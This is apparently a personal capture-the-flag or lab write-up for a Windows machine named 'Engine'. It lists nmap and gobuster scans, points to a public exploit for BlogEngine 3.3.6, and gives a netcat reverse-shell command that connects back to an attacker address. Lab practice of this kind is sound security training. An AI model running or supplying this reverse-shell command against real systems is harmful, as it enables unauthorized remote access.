---
title: Engine
created: '2020-07-07T08:05:38.783Z'
modified: '2020-07-07T08:31:10.527Z'
---

# Engine
- IP: `172.31.1.16`
- OS: `Windows`
## Enumeration
### Writeup
We are running BlogEngine 3.3.6 which is vulnerable: https://www.exploit-db.com/exploits/46353
We use that to get a shell
We can upload nc.exe from `/usr/share/windows-resources/binaries/nc.exe`

`start /b nc.exe 10.10.0.8 1234 -e cmd.exe`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.16`
```

```
</details>

<details>
<summary>gobuster</summary>

- `gobuster dir --wordlist /usr/share/wordlists/dirb/big.txt --url http://172.31.1.16/ -o commands/gobuster-80-root`
```
/aspnet_client (Status: 301)
/blog (Status: 200)
```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
